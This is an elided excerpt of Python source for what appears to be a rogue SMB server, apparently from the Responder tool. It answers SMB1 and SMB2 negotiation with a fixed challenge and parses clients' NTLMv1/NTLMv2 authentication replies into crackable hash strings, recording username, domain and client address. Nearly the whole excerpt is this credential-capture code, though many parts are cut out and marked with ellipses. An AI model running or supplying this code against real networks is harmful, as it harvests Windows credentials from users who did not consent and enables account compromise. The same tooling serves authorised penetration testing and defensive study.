...
def ParseShare(data):
	Share = re.search(b'(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', data[:])
	if Share:
...
def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
	...
	if NthashLen == 24:
		...
		Info         = {'module': 'SMB', 'type': 'NTLMv1-SSP', 'client': client, 'user': Domain+'\\'+Username, 'hash': SMBHash, 'fullhash': WriteHash}

	if NthashLen > 60:
		WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
		Info         = {'module': 'SMB', 'type': 'NTLMv2-SSP', 'client': client, 'user': Domain+'\\'+Username, 'hash': SMBHash, 'fullhash': WriteHash}
...
def ParseLMNTHash(data, client, Challenge):  # Parse SMB NTLMv1/v2
	...
	if NthashLen > 25:
		...
		Info = {'module': 'SMB', 'type': 'NTLMv2', 'client': client, 'user': Domain+'\\'+Username, 'hash': NtHash, 'fullhash': WriteHash}
	...
	if NthashLen == 24:
		...
		Info = {'module': 'SMB', 'type': 'NTLMv1', 'client': client, 'user': Domain+'\\'+Username, 'hash': NtHash, 'fullhash': WriteHash}
...
class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
	...
	def SendPacket(self, Header, Body):
		Packet = str(Header)+str(Body)
		Buffer = Struct('>i', str(Packet))+str(Packet)
		self.request.send(SendBuffer(Buffer))

	def SendPacketAndRecv(self, Header, Body):
		self.SendPacket(Header, Body)
		...
		try:
			...
			while True:
				...
				if data[8:10] == b"\x72\x00":
					...
					if re.search(rb"SMB 2.\?\?\?", data):
						Header = SMB2Header(CreditCharge="\x00\x00",Credits="\x01\x00")
						Body = SMB2NegoAns()

					## Negotiate Protocol Response smbv1
					else:
						Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(RecvBuffer(data)),mid=midcalc(RecvBuffer(data)))
						Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(RecvBuffer(data)))

					Body.calculate()
					data = self.SendPacketAndRecv(Header, Body)

				## Nego answer SMBv2.
				if data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
					Header = SMB2Header(MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'))
					Body = SMB2NegoAns(Dialect="\x10\x02")
					Body.calculate()
					data = self.SendPacketAndRecv(Header, Body)

				## Session Setup 2 answer SMBv2.
				if data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
					Header = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), SessionID=GrabSessionID(data).decode('latin-1'),NTStatus="\x16\x00\x00\xc0")
					Body = SMB2Session1Data(NTLMSSPNtServerChallenge=RecvBuffer(Challenge))
					Body.calculate()
					data = self.SendPacketAndRecv(Header, Body)
				...
				if data[16:18] == b'\x01\x00' and GrabMessageID(data)[0:1] == b'\x02' or GrabMessageID(data)[0:1] == b'\x03' and data[4:5] == b'\xfe':
					...
					Header = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), NTStatus="\x22\x00\x00\xc0", SessionID=GrabSessionID(data).decode('latin-1'))
					Body = SMB2Session2Data()
					data = self.SendPacketAndRecv(Header, Body)

				# Session Setup AndX Request smbv1
				if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":
					IsNT4ClearTxt(data, self.client_address[0])
					
					# STATUS_MORE_PROCESSING_REQUIRED
					Header = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(RecvBuffer(data)),tid="\x00\x00",mid=midcalc(RecvBuffer(data)))
					Body = SMBSession1Data(NTLMSSPNtServerChallenge=RecvBuffer(Challenge))
					Body.calculate()
					data = self.SendPacketAndRecv(Header, Body)
					...
					if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # STATUS_SUCCESS
						if Is_Anonymous(data):
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(RecvBuffer(data)),tid="\x00\x00",uid=uidcalc(RecvBuffer(data)),mid=midcalc(RecvBuffer(data)))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
							Body = SMBSessEmpty()
							self.SendPacket(Header, Body)
							...
							# Send STATUS_SUCCESS
							Header = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(RecvBuffer(data)),tid=tidcalc(RecvBuffer(data)),uid=uidcalc(RecvBuffer(data)),mid=midcalc(RecvBuffer(data)))
							Body = SMBSession2Accept()
							Body.calculate()
							data = self.SendPacketAndRecv(Header, Body)
				
				# Tree Connect AndX Request
				if data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":
					ParseShare(data)
					Header = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(RecvBuffer(data)), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(RecvBuffer(data)))
					Body = SMBTreeData()
					Body.calculate()
					data = self.SendPacketAndRecv(Header, Body)
	...
	def handle(self):
		try:
			...
			if data[8:10] == b"\x72\x00":  #Negotiate proto answer.
				Header = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(RecvBuffer(data)),mid=midcalc(RecvBuffer(data)))
				Body = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(RecvBuffer(data)),Domain="",Key=RecvBuffer(Challenge))
				Body.calculate()
				self.SendPacket(Header, Body)
				data = self.request.recv(1024)
			...
			if data[8:10] == b"\x73\x00":  #Session Setup AndX Request
				if Is_LMNT_Anonymous(data):
					Header = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(RecvBuffer(data)),tid=tidcalc(RecvBuffer(data)),uid=uidcalc(RecvBuffer(data)),mid=midcalc(RecvBuffer(data)))
					self.SendPacket(Header, SMBSessEmpty())
				else:
					ParseLMNTHash(data,self.client_address[0], Challenge)
					Header = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(RecvBuffer(data)),tid=tidcalc(RecvBuffer(data)),uid=uidcalc(RecvBuffer(data)),mid=midcalc(RecvBuffer(data)))
					self.SendPacket(Header, SMBSessEmpty())
					data = self.request.recv(1024)
		except Exception:
			self.request.close()
